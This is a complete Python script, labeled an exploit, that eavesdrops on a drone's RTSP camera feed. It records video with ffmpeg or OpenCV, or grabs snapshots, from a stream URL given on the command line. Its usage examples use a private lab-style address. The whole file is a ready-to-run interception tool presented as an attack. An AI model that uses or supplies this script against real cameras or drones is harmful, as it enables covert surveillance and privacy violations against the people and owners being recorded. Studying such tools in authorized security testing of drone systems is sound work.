#!/usr/bin/env python3
"""
Camera Feed Eavesdropping Exploit Script
Intercepts and records RTSP camera stream from drone
"""

import sys
import subprocess
import time
from pathlib import Path

def check_rtsp_tools():
    """Check if required tools are available"""
    tools = {
        'ffmpeg': False,
        'vlc': False,
        'opencv': False
    }
    
    # Check ffmpeg
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        tools['ffmpeg'] = True
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass
    
    # Check vlc
    try:
        subprocess.run(['vlc', '--version'], capture_output=True, check=True)
        tools['vlc'] = True
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass
    
    # Check opencv (Python)
    try:
        import cv2
        tools['opencv'] = True
    except ImportError:
        pass
    
    return tools

def record_with_ffmpeg(rtsp_url, output_file, duration=None):
    """
    Record RTSP stream using ffmpeg
    
    Args:
        rtsp_url: RTSP stream URL
        output_file: Output video file path
        duration: Recording duration in seconds (None for continuous)
    
    Returns:
        True if successful
    """
    print(f"[*] Recording RTSP stream from {rtsp_url}...")
    print(f"[*] Output: {output_file}")
    
    cmd = [
        'ffmpeg',
        '-i', rtsp_url,
        '-c', 'copy',  # Copy codec (faster)
        '-y',  # Overwrite output file
        str(output_file)
    ]
    
    if duration:
        cmd.extend(['-t', str(duration)])
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if duration:
            print(f"[*] Recording for {duration} seconds...")
            time.sleep(duration)
            process.terminate()
            process.wait()
        else:
            print("[*] Recording... (Press Ctrl+C to stop)")
            try:
                process.wait()
            except KeyboardInterrupt:
                print("\n[*] Stopping recording...")
                process.terminate()
                process.wait()
        
        print(f"[+] Recording saved to {output_file}")
        return True
        
    except FileNotFoundError:
        print("[-] ffmpeg not found. Install with: sudo apt-get install ffmpeg")
        return False
    except Exception as e:
        print(f"[-] Error recording: {e}")
        return False

def record_with_opencv(rtsp_url, output_file, duration=None):
    """
    Record RTSP stream using OpenCV
    
    Args:
        rtsp_url: RTSP stream URL
        output_file: Output video file path
        duration: Recording duration in seconds (None for continuous)
    
    Returns:
        True if successful
    """
    try:
        import cv2
    except ImportError:
        print("[-] OpenCV not installed. Install with: pip install opencv-python")
        return False
    
    print(f"[*] Recording RTSP stream from {rtsp_url}...")
    print(f"[*] Output: {output_file}")
    
    cap = cv2.VideoCapture(rtsp_url)
    
    if not cap.isOpened():
        print(f"[-] Failed to open RTSP stream: {rtsp_url}")
        return False
    
    # Get video properties
    fps = int(cap.get(cv2.CAP_PROP_FPS)) or 30
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    
    print(f"[*] Stream properties: {width}x{height} @ {fps} fps")
    
    # Setup video writer
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(str(output_file), fourcc, fps, (width, height))
    
    start_time = time.time()
    frame_count = 0
    
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                print("[-] Failed to read frame")
                break
            
            out.write(frame)
            frame_count += 1
            
            if duration and (time.time() - start_time) >= duration:
                break
            
            if frame_count % 30 == 0:
                elapsed = time.time() - start_time
                print(f"\r[*] Recorded {frame_count} frames ({elapsed:.1f}s)", end='', flush=True)
        
        print(f"\n[+] Recording saved to {output_file}")
        print(f"[+] Total frames: {frame_count}")
        
    except KeyboardInterrupt:
        print("\n[*] Stopping recording...")
    finally:
        cap.release()
        out.release()
    
    return True

def snapshot_from_stream(rtsp_url, output_file):
    """
    Capture a single snapshot from RTSP stream
    
    Args:
        rtsp_url: RTSP stream URL
        output_file: Output image file path
    
    Returns:
        True if successful
    """
    try:
        import cv2
    except ImportError:
        print("[-] OpenCV not installed. Install with: pip install opencv-python")
        return False
    
    print(f"[*] Capturing snapshot from {rtsp_url}...")
    
    cap = cv2.VideoCapture(rtsp_url)
    
    if not cap.isOpened():
        print(f"[-] Failed to open RTSP stream: {rtsp_url}")
        return False
    
    ret, frame = cap.read()
    cap.release()
    
    if ret:
        cv2.imwrite(str(output_file), frame)
        print(f"[+] Snapshot saved to {output_file}")
        return True
    else:
        print("[-] Failed to capture frame")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 camera_feed_eavesdropping.py <rtsp_url> [output_file] [duration] [method]")
        print("Example: python3 camera_feed_eavesdropping.py rtsp://10.13.0.3:8554/stream")
        print("Example: python3 camera_feed_eavesdropping.py rtsp://10.13.0.3:8554/stream video.mp4 60")
        print("Example: python3 camera_feed_eavesdropping.py rtsp://10.13.0.3:8554/stream snapshot.jpg snapshot")
        print("\nMethods: ffmpeg, opencv, snapshot")
        sys.exit(1)
    
    rtsp_url = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "camera_feed.mp4"
    duration = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else None
    method = sys.argv[4] if len(sys.argv) > 4 else None
    
    # Auto-detect method if not specified
    if not method:
        tools = check_rtsp_tools()
        if tools['ffmpeg']:
            method = 'ffmpeg'
        elif tools['opencv']:
            method = 'opencv'
        else:
            print("[-] No suitable tools found. Install ffmpeg or opencv-python")
            sys.exit(1)
    
    # Handle snapshot mode
    if method == 'snapshot' or output_file.endswith(('.jpg', '.jpeg', '.png')):
        success = snapshot_from_stream(rtsp_url, output_file)
    elif method == 'ffmpeg':
        success = record_with_ffmpeg(rtsp_url, output_file, duration)
    elif method == 'opencv':
        success = record_with_opencv(rtsp_url, output_file, duration)
    else:
        print(f"[-] Unknown method: {method}")
        sys.exit(1)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
